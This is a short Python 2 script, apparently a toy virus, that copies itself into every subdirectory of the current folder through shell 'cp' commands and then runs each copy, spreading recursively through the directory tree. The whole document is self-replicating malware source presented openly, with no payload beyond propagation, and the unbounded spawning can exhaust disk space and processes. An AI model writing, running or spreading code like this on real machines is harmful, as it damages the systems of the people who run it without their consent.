import os
import sys

def listDirectories(current):
    liste = []
    dirList= []
    liste = os.listdir(current)
    for test in liste:
        if os.path.isdir(test):
            dirList.append(test)
    return dirList 

def colonize(dirList, virus):
    for elt in dirList:
        print elt
        cmd = "cp "+virus+" "+elt+"/"
        os.system(cmd)
        cmd = elt+"/"
        os.chdir(cmd)
        os.system("python virusPy.py")
        os.chdir("..")

if __name__=="__main__":
        dirList=[]
        dirList = listDirectories('.')
        colonize(dirList, sys.argv[0])
